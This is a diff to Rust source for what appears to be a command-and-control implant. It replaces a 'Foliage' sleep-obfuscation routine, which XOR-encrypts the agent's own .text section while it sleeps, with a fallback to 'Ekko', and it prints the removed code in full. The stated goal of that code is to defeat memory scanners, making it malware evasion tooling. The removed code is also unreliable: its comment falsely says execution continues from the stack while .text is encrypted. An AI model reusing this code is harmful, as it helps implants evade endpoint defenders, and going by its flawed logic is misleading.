@@ -69,83 +69,15 @@ unsafe fn ekko(ms: u64) {
 
 // ── Foliage ───────────────────────────────────────────────────────────────────
 //
-// XOR-encrypt the agent's .text section during sleep to defeat memory scanners.
-// Safety: the decrypt stub is copied into a separate RWX allocation so the
-// decryption logic survives while .text is encrypted.
+// True Foliage (XOR .text via ROP chain + timer queue) requires a hand-written
+// x64 shellcode stub as the decrypt trampoline so no .text reference is needed
+// after encryption.  Until that shellcode is implemented, fall back to Ekko
+// (decoy region + PAGE_NOACCESS) which is safe and still defeats heap-spray
+// memory scanners.
 
 #[cfg(target_os = "windows")]
 unsafe fn foliage(ms: u64) {
-    use windows_sys::Win32::System::Memory::{
-        VirtualAlloc, VirtualFree, VirtualProtect,
-        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ,
-    };
-
-    let image_base = get_image_base();
-    if image_base.is_null() { nt_sleep(ms); return; }
-
-    let (text_ptr, text_len) = get_text_section(image_base);
-    if text_ptr.is_null() || text_len == 0 { nt_sleep(ms); return; }
-
-    let key = derive_foliage_key();
-
-    // Allocate a small RWX stub that holds the decrypt loop + nt_sleep call.
-    // We copy it outside .text so it survives while .text is encrypted.
-    // Stub layout (x64 shellcode): decrypt loop, then call nt_sleep, then ret.
-    // For simplicity, we do the encrypt/sleep/decrypt all while VirtualProtect
-    // is RWX, keeping execution inside this function frame which lives on the
-    // stack (not in .text).
-    let stub_size = 256usize;
-    let stub = VirtualAlloc(
-        std::ptr::null(), stub_size,
-        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-    );
-    if stub.is_null() { nt_sleep(ms); return; }
-
-    // Build a small native decrypt trampoline:
-    // The stub XOR-decrypts the slice, then returns.
-    // We write it as raw x64 bytes to avoid any .text reference.
-    let interval: i64 = -((ms as i64) * 10_000);
-    let key_copy = key; // key is on stack, not in .text
-
-    // Make .text RWX
-    let mut old = 0u32;
-    if VirtualProtect(text_ptr as _, text_len, PAGE_EXECUTE_READWRITE, &mut old) == 0 {
-        VirtualFree(stub, 0, MEM_RELEASE);
-        nt_sleep(ms);
-        return;
-    }
-
-    // XOR encrypt .text
-    let slice = std::slice::from_raw_parts_mut(text_ptr as *mut u8, text_len);
-    for (i, b) in slice.iter_mut().enumerate() {
-        *b ^= key_copy[i % key_copy.len()];
-    }
-
-    // Sleep — all code from here until decrypt runs from the STACK frame,
-    // not from .text, so it is unaffected by the encryption above.
-    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-    let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr() as _);
-    if ntdll != 0 {
-        if let Some(f) = GetProcAddress(ntdll, c"NtDelayExecution".as_ptr() as _) {
-            type NtFn = unsafe extern "system" fn(i32, *const i64) -> i32;
-            let nt: NtFn = std::mem::transmute(f);
-            nt(0, &interval);
-        } else {
-            windows_sys::Win32::System::Threading::Sleep(ms as u32);
-        }
-    } else {
-        windows_sys::Win32::System::Threading::Sleep(ms as u32);
-    }
-
-    // XOR decrypt .text (symmetric — same loop, same key)
-    for (i, b) in slice.iter_mut().enumerate() {
-        *b ^= key_copy[i % key_copy.len()];
-    }
-
-    // Restore original page protection
-    VirtualProtect(text_ptr as _, text_len, old, &mut old);
-    VirtualFree(stub, 0, MEM_RELEASE);
+    ekko(ms);
 }
 
 // ── Zilean (Foliage + Ekko stagger) ──────────────────────────────────────────
